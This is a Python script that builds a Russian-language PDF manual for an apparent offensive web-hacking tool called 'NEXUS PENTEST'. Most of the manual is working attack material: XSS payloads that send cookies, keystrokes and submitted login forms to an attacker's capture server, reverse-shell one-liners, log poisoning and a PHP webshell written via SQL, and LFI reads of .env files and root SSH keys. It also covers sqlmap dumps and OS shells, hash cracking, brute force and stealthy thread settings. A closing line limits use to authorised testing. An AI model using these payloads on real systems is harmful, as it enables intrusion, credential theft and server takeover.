from fpdf import FPDF, XPos, YPos

FONT_R = "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf"
FONT_B = "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf"
FONT_M = "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf"
FONT_MB = "/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf"

class PDF(FPDF):
    def __init__(self):
        super().__init__()
        self.add_font("R",  "", FONT_R)
        self.add_font("B",  "", FONT_B)
        self.add_font("M",  "", FONT_M)
        self.add_font("MB", "", FONT_MB)

    def header(self):
        self.set_font("B", "", 15)
        self.set_fill_color(30, 80, 160)   # синий
        self.set_text_color(255, 255, 255)  # белый текст
        self.cell(0, 14, "  NEXUS PENTEST — Полная инструкция", fill=True,
                  new_x=XPos.LMARGIN, new_y=YPos.NEXT, align="L")
        self.ln(4)
        self.set_text_color(30, 30, 30)

    def footer(self):
        self.set_y(-13)
        self.set_font("R", "", 8)
        self.set_draw_color(180, 180, 180)
        self.line(12, self.get_y(), 198, self.get_y())
        self.set_text_color(120, 120, 120)
        self.cell(0, 8, f"NEXUS PENTEST — Инструкция  |  Страница {self.page_no()}", align="C")

    def section(self, title):
        self.ln(4)
        self.set_font("B", "", 12)
        self.set_fill_color(220, 235, 255)  # светло-голубой фон
        self.set_text_color(20, 60, 140)    # тёмно-синий текст
        self.set_draw_color(100, 150, 220)
        self.cell(0, 10, f"  {title}", fill=True, border="LB",
                  new_x=XPos.LMARGIN, new_y=YPos.NEXT)
        self.ln(2)
        self.set_text_color(30, 30, 30)
        self.set_draw_color(0, 0, 0)

    def sub(self, title):
        self.ln(2)
        self.set_font("B", "", 10)
        self.set_text_color(20, 120, 60)    # тёмно-зелёный
        self.cell(4, 6, "", new_x=XPos.RIGHT, new_y=YPos.TOP)  # отступ
        self.cell(0, 6, title, new_x=XPos.LMARGIN, new_y=YPos.NEXT)
        self.set_text_color(30, 30, 30)

    def body(self, text):
        self.set_font("R", "", 9)
        self.set_text_color(40, 40, 40)
        self.multi_cell(0, 5.5, text)
        self.ln(1)

    def code(self, text):
        self.set_font("M", "", 8)
        self.set_fill_color(240, 245, 240)  # очень светлый зеленоватый
        self.set_text_color(20, 100, 40)    # тёмно-зелёный текст
        self.set_draw_color(180, 210, 180)
        self.multi_cell(0, 5, text, fill=True, border=1)
        self.set_text_color(40, 40, 40)
        self.set_draw_color(0, 0, 0)
        self.ln(2)

    def warn(self, text):
        self.ln(2)
        self.set_font("B", "", 9)
        self.set_fill_color(255, 235, 235)  # светло-красный фон
        self.set_text_color(160, 20, 20)    # тёмно-красный текст
        self.set_draw_color(220, 100, 100)
        self.multi_cell(0, 6, text, fill=True, border=1)
        self.set_text_color(40, 40, 40)
        self.set_draw_color(0, 0, 0)
        self.ln(2)


pdf = PDF()
pdf.set_auto_page_break(auto=True, margin=15)
pdf.set_margins(12, 12, 12)

# ═══════════════════════════════════════════════
# СТРАНИЦА 1 — УСТАНОВКА
# ═══════════════════════════════════════════════
pdf.add_page()

pdf.section("1. УСТАНОВКА И ЗАПУСК")

pdf.sub("Шаг 1 — Установить Python")
pdf.body("Скачать с сайта python.org, версия 3.10 или выше.\nПри установке ОБЯЗАТЕЛЬНО поставить галочку: Add Python to PATH")

pdf.sub("Шаг 2 — Скачать программу с GitHub")
pdf.code("git clone https://github.com/nst05/tether-usdt-trc20.git\ncd tether-usdt-trc20\ngit checkout claude/sleepy-meitner-AmHOz\ncd pentest")
pdf.body("Или скачать ZIP: GitHub -> Code -> Download ZIP -> распаковать -> зайти в папку pentest")
pdf.body("В папке должны быть три файла:\n  pentest_gui.py   — главный файл (запускать)\n  pentest_core.py  — библиотека модулей\n  exploit_engine.py — движок эксплойтов")

pdf.sub("Шаг 3 — Установить зависимости")
pdf.code("pip install customtkinter requests httpx paramiko beautifulsoup4 lxml dnspython websocket-client")

pdf.sub("Шаг 4 — Запуск")
pdf.code("python pentest_gui.py")

pdf.sub("Возможные ошибки:")
pdf.body("• 'pip не является командой'")
pdf.code("python -m pip install customtkinter requests httpx paramiko beautifulsoup4 lxml dnspython websocket-client")
pdf.body("• 'python не найден' — переустановить Python с галочкой Add to PATH\n• 'ModuleNotFoundError: No module named X'")
pdf.code("pip install X")

# ═══════════════════════════════════════════════
# СТРАНИЦА 2 — СКАНИРОВАНИЕ И НАХОДКИ
# ═══════════════════════════════════════════════
pdf.add_page()

pdf.section("2. ВКЛАДКА 'СКАНИРОВАНИЕ'")
pdf.body("1. Ввести URL цели в поле: например http://localhost.tu\n"
         "2. Во вкладке 'Настройки' выбрать нужные модули\n"
         "3. Нажать кнопку 'Запустить сканирование'\n"
         "4. Внизу в реальном времени виден лог — что сейчас проверяется\n"
         "5. По завершении статус покажет итог: HIGH / MEDIUM / LOW / INFO")

pdf.section("3. ВКЛАДКА 'НАХОДКИ'")
pdf.body("Все уязвимости отсортированы по критичности:\n"
         "  HIGH   — красный  (критические, требуют немедленного исправления)\n"
         "  MEDIUM — жёлтый   (важные)\n"
         "  LOW    — синий    (незначительные)\n"
         "  INFO   — серый    (информационные)")
pdf.body("Фильтр — ввести слово для поиска: sqli, xss, lfi и т.д.\n"
         "Фильтр по угрозе — ВСЕ / HIGH / MEDIUM / LOW\n"
         "Клик на строку -> внизу появятся полные детали находки\n"
         "Кнопки HTML / JSON / TXT — экспорт полного отчёта")

pdf.sub("ПРАВЫЙ КЛИК на уязвимость — контекстное меню:")
pdf.body("Для SQLi находок:")
pdf.code("  Авто эксплойт       — запускает полную автоматическую атаку\n"
         "  Получить таблицы    — достаёт список таблиц из базы данных\n"
         "  Версия БД / Юзер    — версия MySQL и текущий пользователь")
pdf.body("Для XSS находок:")
pdf.code("  Cookie Stealer      — генерирует payload кражи кук\n"
         "  Keylogger           — генерирует payload кейлоггера\n"
         "  Сканер портов       — сканирует внутреннюю сеть через браузер\n"
         "  Запустить захват    — запускает сервер на порту 7777")
pdf.body("Для LFI находок:")
pdf.code("  Читать /etc/passwd  — список пользователей системы\n"
         "  Читать .env         — пароли БД и секретные ключи\n"
         "  PHP исходник        — читает PHP файлы через php://filter")
pdf.body("Для CMDi находок:")
pdf.code("  id && whoami        — проверить от какого юзера работает сервер\n"
         "  ls -la /            — содержимое корневой директории\n"
         "  Reverse Shell       — payload для обратного подключения")
pdf.body("Всегда доступно:")
pdf.code("  Копировать URL      — скопировать URL в буфер\n"
         "  Копировать детали   — скопировать детали находки\n"
         "  Открыть в ручном запросе — открыть URL во вкладке Ручной запрос")

# ═══════════════════════════════════════════════
# СТРАНИЦА 3 — ИСТОРИЯ, КОДИРОВЩИК, ФАЗЗЕР
# ═══════════════════════════════════════════════
pdf.add_page()

pdf.section("4. ВКЛАДКА 'ИСТОРИЯ'")
pdf.body("Показывает все HTTP запросы которые делала программа во время сканирования.\n"
         "Цвета строк:\n"
         "  Зелёный  — 2xx (успешные)\n"
         "  Синий    — 3xx (перенаправления)\n"
         "  Красный  — 4xx (ошибки клиента)\n"
         "  Оранжевый — 5xx (ошибки сервера)\n"
         "Клик на запрос — внизу видишь полный Request и Response")

pdf.section("5. ВКЛАДКА 'КОДИРОВЩИК'")
pdf.body("Инструмент для кодирования и декодирования данных вручную:")
pdf.body("1. Вставить текст в поле\n"
         "2. Выбрать тип кодирования:\n"
         "   Base64 — стандартное кодирование\n"
         "   URL    — кодирование для URL (%20, %3D и т.д.)\n"
         "   HTML   — экранирование HTML (&lt; &gt; &amp;)\n"
         "   Hex    — шестнадцатеричное представление\n"
         "   MD5    — хеш MD5\n"
         "   SHA1   — хеш SHA1\n"
         "   SHA256 — хеш SHA256\n"
         "3. Нажать Кодировать или Декодировать\n"
         "4. Результат скопировать кнопкой")
pdf.body("Применение: обход WAF, подготовка payload'ов, декодирование токенов JWT")

pdf.section("6. ВКЛАДКА 'ФАЗЗЕР'")
pdf.body("Автоматический перебор payload'ов по списку.")
pdf.body("1. Ввести URL с маркером FUZZ в нужном месте:")
pdf.code("http://localhost.tu/page?id=FUZZ\nhttp://localhost.tu/FUZZ.php\nhttp://localhost.tu/catalog/?q=FUZZ")
pdf.body("2. Выбрать список payload'ов:\n"
         "   XSS    — межсайтовый скриптинг\n"
         "   SQLi   — SQL инъекции\n"
         "   LFI    — включение локальных файлов\n"
         "   Кастомный — загрузить свой список\n"
         "3. Указать количество потоков (по умолчанию 10)\n"
         "4. Нажать Запустить\n"
         "5. Программа перебирает и показывает аномальные ответы:\n"
         "   — необычный размер ответа\n"
         "   — другой статус код\n"
         "   — большое время ответа (возможный blind SQLi)")

pdf.section("7. ВКЛАДКА 'РУЧНОЙ ЗАПРОС'")
pdf.body("Аналог Burp Suite Repeater — отправлять запросы вручную:")
pdf.body("1. Ввести URL\n"
         "2. Выбрать метод: GET / POST / PUT / DELETE / PATCH\n"
         "3. Добавить заголовки (Cookie, Authorization, и т.д.)\n"
         "4. Добавить тело запроса (для POST)\n"
         "5. Нажать Отправить\n"
         "6. Справа — полный ответ сервера: статус, заголовки, тело")
pdf.body("Применение: ручная проверка уязвимостей, тест бизнес-логики, перебор параметров")

# ═══════════════════════════════════════════════
# СТРАНИЦА 4 — SQLi ЭКСПЛОЙТ
# ═══════════════════════════════════════════════
pdf.add_page()

pdf.section("8. ЭКСПЛОЙТ — SQLi (SQL ИНЪЕКЦИЯ)")

pdf.sub("Когда использовать:")
pdf.body("Сканер нашёл находку с модулем 'sqli' — SQL Injection (time-based) или SQL Injection (error-based)")

pdf.sub("Порядок действий:")
pdf.body("1. Правый клик на находку -> Авто эксплойт\n"
         "   ИЛИ перейти во вкладку Эксплойт -> SQLi Эксплойт\n"
         "2. Ввести URL уязвимой страницы\n"
         "3. Ввести уязвимый параметр (из поля 'Detail' в находке)\n"
         "4. Выбрать метод GET или POST")

pdf.sub("Кнопки и что они делают:")
pdf.code("Авто эксплойт  — выполняет все шаги автоматически:\n"
         "                 столбцы -> тип БД -> версия -> юзер -> таблицы\n\n"
         "Найти столбцы  — определяет количество столбцов через ORDER BY:\n"
         "                 Payload: 1' ORDER BY 1-- / ORDER BY 2-- ...\n\n"
         "Версия БД      — получает версию сервера БД:\n"
         "                 MySQL:      SELECT version()\n"
         "                 MSSQL:      SELECT @@version\n"
         "                 PostgreSQL: SELECT version()\n\n"
         "Пользователь   — текущий пользователь и имя базы:\n"
         "                 SELECT user(), database()\n\n"
         "Таблицы        — список всех таблиц текущей базы:\n"
         "                 SELECT table_name FROM information_schema.tables\n"
         "                 WHERE table_schema=database()\n\n"
         "Столбцы        — ввести имя таблицы -> получить столбцы:\n"
         "                 SELECT column_name FROM information_schema.columns\n"
         "                 WHERE table_name='users'\n\n"
         "Дамп таблицы   — ввести таблицу и столбцы -> выгрузить данные:\n"
         "                 SELECT id,email,password FROM users LIMIT 20")

pdf.sub("Ручные команды через sqlmap (в терминале):")
pdf.code("# Найти уязвимость и получить базы данных\nsqlmap -u \"http://localhost.tu/catalog/?q=1\" --dbs --batch\n\n"
         "# Получить таблицы конкретной базы\nsqlmap -u \"http://localhost.tu/catalog/?q=1\" -D название_базы --tables --batch\n\n"
         "# Получить столбцы таблицы\nsqlmap -u \"http://localhost.tu/catalog/?q=1\" -D база -T users --columns --batch\n\n"
         "# Выгрузить данные таблицы\nsqlmap -u \"http://localhost.tu/catalog/?q=1\" -D база -T users --dump --batch\n\n"
         "# POST запрос\nsqlmap -u \"http://localhost.tu/login\" --data=\"user=1&pass=1\" -p user --dbs --batch\n\n"
         "# Обход WAF\nsqlmap -u \"http://localhost.tu/?q=1\" --tamper=space2comment,between --dbs --batch\n\n"
         "# Получить OS shell\nsqlmap -u \"http://localhost.tu/?q=1\" --os-shell --batch")

pdf.sub("Что делать с найденными паролями:")
pdf.body("Пароли обычно хранятся в виде хешей. Для расшифровки:")
pdf.code("# Установить hashcat\n# Определить тип хеша по виду:\n"
         "  $2y$... или $2a$... = bcrypt\n"
         "  32 символа          = MD5\n"
         "  40 символов         = SHA1\n"
         "  64 символа          = SHA256\n\n"
         "# Взломать MD5 хеш:\nhashcat -m 0 -a 0 hash.txt rockyou.txt\n\n"
         "# Взломать bcrypt:\nhashcat -m 3200 -a 0 hash.txt rockyou.txt\n\n"
         "# Онлайн сервисы: crackstation.net, hashes.com")

# ═══════════════════════════════════════════════
# СТРАНИЦА 5 — XSS
# ═══════════════════════════════════════════════
pdf.add_page()

pdf.section("9. ЭКСПЛОЙТ — XSS (МЕЖСАЙТОВЫЙ СКРИПТИНГ)")

pdf.sub("Когда использовать:")
pdf.body("Сканер нашёл находку 'Reflected XSS' или 'DOM XSS' с модулем 'xss'")

pdf.sub("Шаг 1 — Запустить Сервер захвата:")
pdf.body("Вкладка Эксплойт -> Сервер захвата -> Запустить\n"
         "Сервер запустится на http://ТВО_IP:7777\n"
         "Скопировать URL — он нужен для payload'ов")

pdf.sub("Cookie Stealer — кража сессии:")
pdf.code("# Payload вставляется в уязвимый параметр:\n"
         "<script>document.location='http://ТВОЙ_IP:7777/?c='+encodeURIComponent(document.cookie)</script>\n\n"
         "<img src=x onerror=\"fetch('http://ТВОЙ_IP:7777/?c='+encodeURIComponent(document.cookie))\">\n\n"
         "<svg onload=\"location='http://ТВОЙ_IP:7777/?c='+document.cookie\">\n\n"
         "# Пример внедрения через URL:\nhttp://localhost.tu/search?q=<script>document.location='http://IP:7777/?c='+document.cookie</script>")

pdf.sub("Keylogger — перехват нажатий клавиш:")
pdf.code("<script>\nvar k='';\ndocument.onkeypress=function(e){\n"
         "  k+=e.key;\n  if(k.length%10==0) fetch('http://ТВОЙ_IP:7777/?k='+btoa(k));\n};\n</script>")

pdf.sub("Сканер внутренних портов:")
pdf.code("<script>\nvar ports=[80,443,22,21,3306,5432,6379,8080,27017];\nvar open=[];\nports.forEach(function(p){\n"
         "  var img=new Image(); var t=Date.now();\n"
         "  img.onload=img.onerror=function(){\n"
         "    if(Date.now()-t<500) open.push(p);\n"
         "    if(open.length) fetch('http://ТВОЙ_IP:7777/?ports='+open.join(','));\n  };\n"
         "  img.src='http://127.0.0.1:'+p+'/x';\n});\n</script>")

pdf.sub("Кража форм (логин/пароль когда жертва вводит):")
pdf.code("<script>\ndocument.querySelectorAll('form').forEach(function(f){\n"
         "  f.addEventListener('submit',function(){\n"
         "    var d=new FormData(f); var obj={};\n"
         "    d.forEach(function(v,k){obj[k]=v});\n"
         "    fetch('http://ТВОЙ_IP:7777',{method:'POST',body:JSON.stringify(obj)});\n  });\n});\n</script>")

pdf.sub("Как использовать украденные куки:")
pdf.code("1. Сервер захвата получил: cookie=session=abc123xyz\n"
         "2. Открыть браузер -> F12 -> Console:\n"
         "   document.cookie = 'session=abc123xyz'\n"
         "3. Перейти на сайт — ты вошёл как жертва\n\n"
         "Или через curl:\ncurl -b 'session=abc123xyz' http://localhost.tu/admin")

# ═══════════════════════════════════════════════
# СТРАНИЦА 6 — LFI
# ═══════════════════════════════════════════════
pdf.add_page()

pdf.section("10. ЭКСПЛОЙТ — LFI (ЧТЕНИЕ ЛОКАЛЬНЫХ ФАЙЛОВ)")

pdf.sub("Когда использовать:")
pdf.body("Сканер нашёл 'LFI/Path Traversal' с модулем 'lfi'")

pdf.sub("Вкладка Эксплойт -> LFI Чтение:")
pdf.body("1. Ввести URL уязвимой страницы\n"
         "2. Ввести уязвимый параметр (из находки)\n"
         "3. Нажать нужную кнопку")

pdf.sub("Читать /etc/passwd — список пользователей системы:")
pdf.code("# Программа пробует:\nhttp://localhost.tu/?page=/etc/passwd\nhttp://localhost.tu/?page=../../../etc/passwd\nhttp://localhost.tu/?page=php://filter/convert.base64-encode/resource=/etc/passwd\n\n"
         "# Ищем в ответе:\nroot:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin")

pdf.sub("Читать .env — секретные ключи и пароли БД:")
pdf.code("# Программа ищет файл по путям:\n/proc/self/environ\n../../../../.env\n../../../.env\n\n"
         "# Что ищем в ответе:\nAPP_KEY=base64:xxx   <- ключ шифрования Laravel\nDB_PASSWORD=secret   <- пароль базы данных\nDB_USERNAME=root     <- логин базы данных\nMAIL_PASSWORD=xxx    <- пароль почты\nAWS_SECRET=xxx       <- ключи AWS")

pdf.sub("PHP исходник через php://filter:")
pdf.code("# Читает PHP файл в base64 (обход ограничений):\nhttp://localhost.tu/?page=php://filter/convert.base64-encode/resource=index.php\n\n"
         "# Расшифровать base64 вручную:\npython3 -c \"import base64; print(base64.b64decode('ПОЛУЧЕННАЯ_СТРОКА').decode())\"\n\n"
         "# Что искать в исходниках:\n- Жёстко вписанные пароли\n- Логику авторизации\n- SQL запросы\n- Пути к файлам и конфигам")

pdf.sub("Log Poisoning — выполнение команд через LFI:")
pdf.code("# Шаг 1: Отравить лог — вписать PHP код в User-Agent:\ncurl -A '<?php system($_GET[\"cmd\"]); ?>' http://localhost.tu/\n\n"
         "# Шаг 2: Подключить лог через LFI:\nhttp://localhost.tu/?page=/var/log/nginx/access.log&cmd=id\n\n"
         "# Другие пути логов:\n/var/log/apache2/access.log\n/var/log/apache/access.log\n/proc/self/fd/2\n\n"
         "# Если сработало — в ответе увидишь:\nuid=33(www-data) gid=33(www-data)")

pdf.sub("Полезные файлы для чтения:")
pdf.code("/etc/passwd          — пользователи системы\n"
         "/etc/hosts           — сетевая конфигурация\n"
         "/proc/self/environ   — переменные окружения\n"
         "/var/www/.env        — конфиг Laravel\n"
         "/var/www/html/.env   — конфиг приложения\n"
         "config/database.php  — конфиг БД\n"
         "/etc/mysql/my.cnf    — конфиг MySQL\n"
         "/root/.ssh/id_rsa    — приватный SSH ключ root")

# ═══════════════════════════════════════════════
# СТРАНИЦА 7 — CMDi И ADMINER
# ═══════════════════════════════════════════════
pdf.add_page()

pdf.section("11. ЭКСПЛОЙТ — CMDi (ВЫПОЛНЕНИЕ КОМАНД)")

pdf.sub("Когда использовать:")
pdf.body("Сканер нашёл 'Command Injection' с модулем 'cmdi'")

pdf.sub("Вкладка Эксплойт -> CMDi Выполнение:")
pdf.body("1. Ввести URL и уязвимый параметр\n"
         "2. В поле 'Команда' написать что выполнить\n"
         "3. Нажать Выполнить")

pdf.sub("Программа перебирает разделители:")
pdf.code("; команда          — точка с запятой\n"
         "| команда          — пайп\n"
         "& команда          — амперсанд\n"
         "`команда`          — обратные кавычки\n"
         "$(команда)         — подстановка\n"
         "%0a команда        — перенос строки (URL encoded)\n\n"
         "# Примеры payload'ов:\nhttp://localhost.tu/?host=127.0.0.1; id\nhttp://localhost.tu/?host=127.0.0.1| whoami\nhttp://localhost.tu/?host=127.0.0.1`cat /etc/passwd`")

pdf.sub("Полезные команды для проверки:")
pdf.code("id                          — узнать пользователя\nwhoami                      — имя текущего пользователя\nhostname                    — имя сервера\nuname -a                    — версия ОС и ядра\ncat /etc/passwd             — список пользователей\nls -la /var/www             — файлы сайта\ncat /var/www/.env           — секреты приложения\nifconfig / ip a             — сетевые интерфейсы\nnetstat -tulnp              — открытые порты\nps aux                      — запущенные процессы\ncrontab -l                  — задачи cron\nfind / -name '*.env' 2>/dev/null  — найти .env файлы")

pdf.sub("Reverse Shell — обратное подключение:")
pdf.body("1. На своём компьютере запустить слушатель:")
pdf.code("nc -lvnp 4444")
pdf.body("2. В программе нажать 'Reverse Shell payloads', ввести свой IP и порт\n"
         "3. Выбрать один из payload'ов и отправить на сервер:")
pdf.code("# Bash:\nbash -i >& /dev/tcp/ТВОЙ_IP/4444 0>&1\n\n"
         "# Python3:\npython3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'\n\n"
         "# PHP:\nphp -r '$sock=fsockopen(\"IP\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n\n"
         "# Netcat:\nnc -e /bin/bash IP 4444\n"
         "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 4444 >/tmp/f")
pdf.body("4. На своём компьютере появится shell — полный доступ к серверу")

pdf.section("12. ЭКСПЛОЙТ — ADMINER БРУТФОРС")
pdf.body("Adminer — это веб-интерфейс для управления базой данных.\n"
         "Если он доступен (находка: /adminer.php) — можно подобрать пароль.")
pdf.body("1. Ввести URL: http://localhost.tu/adminer.php\n"
         "2. Список серверов (каждый с новой строки): 127.0.0.1, localhost, db, mysql\n"
         "3. Список пользователей: root, admin, laravel, user\n"
         "4. Список паролей: root, secret, password, 123456, (пустой)\n"
         "5. Нажать Запустить — видишь каждую попытку в реальном времени")
pdf.body("При нахождении:")
pdf.code("[!!!] VALID: server=127.0.0.1 user=root password='root'")
pdf.body("Затем войти в Adminer через браузер и получить полный доступ к БД.\n"
         "Через Adminer можно:\n"
         "— Читать и изменять любые данные\n"
         "— Создать нового администратора\n"
         "— Выполнить SQL запросы\n"
         "— Загрузить PHP shell через: SELECT '<?php system($_GET[\"c\"])?>' INTO OUTFILE '/var/www/html/shell.php'")

# ═══════════════════════════════════════════════
# СТРАНИЦА 8 — БИЗНЕС-ЛОГИКА
# ═══════════════════════════════════════════════
pdf.add_page()

pdf.section("13. БИЗНЕС-ЛОГИКА — УНИКАЛЬНЫЕ УЯЗВИМОСТИ")

pdf.sub("IDOR Сканер — доступ к чужим данным:")
pdf.body("IDOR (Insecure Direct Object Reference) — можно получить данные другого пользователя\nпросто изменив ID в запросе.")
pdf.body("1. URL: http://localhost.tu/order?id=1\n"
         "2. Параметр: id\n"
         "3. Диапазон: от 1 до 100\n"
         "4. Нажать Сканировать")
pdf.body("Программа сравнивает каждый ответ с базовым — если размер отличается > 50 байт,\nэто возможный IDOR. Проверить вручную:")
pdf.code("# Запрос от своего аккаунта:\ncurl -b 'session=МОЙ_ТОКЕН' http://localhost.tu/order?id=100\n\n"
         "# Если видишь чужой заказ — IDOR подтверждён!")

pdf.sub("Гонка запросов (Race Condition):")
pdf.body("Одновременная отправка множества запросов может вызвать:\n"
         "— Многократное списание баллов\n"
         "— Использование промокода несколько раз\n"
         "— Двойное пополнение баланса")
pdf.body("1. Ввести URL (например http://localhost.tu/apply-promo)\n"
         "2. Параметр: code\n"
         "3. Количество потоков: 50-100\n"
         "4. Нажать Запустить гонку")
pdf.body("Если среди 50 ответов есть разные статусы или размеры — уязвимость найдена.\n"
         "Вручную через Python:")
pdf.code("import threading, requests\n\n"
         "def send():\n    requests.post('http://localhost.tu/apply-promo',\n"
         "                  data={'code': 'PROMO2024'},\n                  cookies={'session':'ТВОЙ_ТОКЕН'})\n\n"
         "threads = [threading.Thread(target=send) for _ in range(50)]\n"
         "for t in threads: t.start()\nfor t in threads: t.join()")

pdf.sub("Манипуляция ценой:")
pdf.body("Проверяет принимает ли сервер некорректные значения цен:")
pdf.code("Тесты:\n  price = -1         -> купить товар за отрицательную цену\n"
         "  price = 0          -> купить бесплатно\n  price = 0.001      -> купить за копейку\n"
         "  price = 99999999   -> проверить переполнение\n  price = abc        -> строка вместо числа")
pdf.body("Если сервер принял заказ с отрицательной/нулевой ценой — критическая уязвимость!")

pdf.sub("Цепочки эксплойтов:")
pdf.body("После сканирования нажать 'Анализировать находки' — программа предложит цепочки:\n")
pdf.code("SQLi -> Дамп паролей -> Взлом хешей -> Вход как администратор\n\n"
         "XSS + Админка -> Украсть куки админа -> Полный доступ к панели\n\n"
         "LFI -> Читать .env -> Получить APP_KEY -> Подделать сессию\n\n"
         "LFI + SQLi -> Записать PHP shell в БД -> Подключить через LFI -> RCE\n\n"
         "CMDi -> Reverse Shell -> Полный доступ к серверу\n\n"
         "Adminer -> Брутфорс root:root -> Войти в БД -> Записать PHP shell")

pdf.section("14. НАСТРОЙКИ")
pdf.body("Включить/выключить модули сканирования:\n\n"
         "  Заголовки — проверяет наличие security headers (CSP, HSTS и т.д.)\n"
         "  Пути      — перебирает скрытые файлы и директории\n"
         "  XSS       — тестирует параметры на межсайтовый скриптинг\n"
         "  SQLi      — тестирует параметры на SQL инъекции\n"
         "  LFI       — тестирует параметры на чтение файлов\n"
         "  SSTI      — тестирует инъекции в шаблонизаторы (Jinja2, Twig)\n"
         "  CMDi      — тестирует выполнение команд ОС\n"
         "  Blind SQLi — медленная но глубокая проверка (извлечение данных)\n\n"
         "Количество потоков: больше = быстрее, но заметнее для WAF/IDS сервера.\n"
         "Рекомендуется: 5-10 для незаметного сканирования, 20-50 для быстрого.")

pdf.warn("\n  ВАЖНО: Программа предназначена ТОЛЬКО для тестирования\n"
         "  СОБСТВЕННОГО сервера или с явного письменного разрешения.\n"
         "  Использование против чужих сайтов — уголовная ответственность.")

pdf.output("/home/user/tether-usdt-trc20/nexus_pentest_instrukciya.pdf")
print("PDF создан!")
